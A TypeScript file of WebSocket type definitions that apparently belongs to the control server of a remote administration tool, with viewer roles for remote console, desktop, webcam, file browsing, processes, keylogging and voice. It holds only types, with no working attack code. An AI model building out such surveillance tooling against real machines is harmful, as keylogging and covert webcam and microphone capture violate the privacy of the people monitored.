import type { ServerWebSocket } from "bun";
import type { ClientRole } from "../types";

export type SocketRole =
  | ClientRole
  | "console_viewer"
  | "rd_viewer"
  | "webcam_viewer"
  | "file_browser_viewer"
  | "process_viewer"
  | "notifications_viewer"
  | "keylogger_viewer"
  | "voice_viewer"
  | "dashboard_viewer";

export type SocketData = {
  role: SocketRole;
  clientId: string;
  sessionId?: string;
  ip?: string;
  userRole?: string;
  userId?: number;
  wasKnown?: boolean;
  autoTasksRan?: boolean;
};

export type ConsoleSession = {
  id: string;
  clientId: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
};

export type RemoteDesktopViewer = {
  id: string;
  clientId: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
};

export type FileBrowserViewer = {
  id: string;
  clientId: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
};

export type ProcessViewer = {
  id: string;
  clientId: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
};

export type NotificationsViewer = {
  id: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
  userId?: number;
  userRole?: string;
};

export type KeyloggerViewer = {
  id: string;
  clientId: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
};

export type VoiceViewer = {
  id: string;
  clientId: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
};
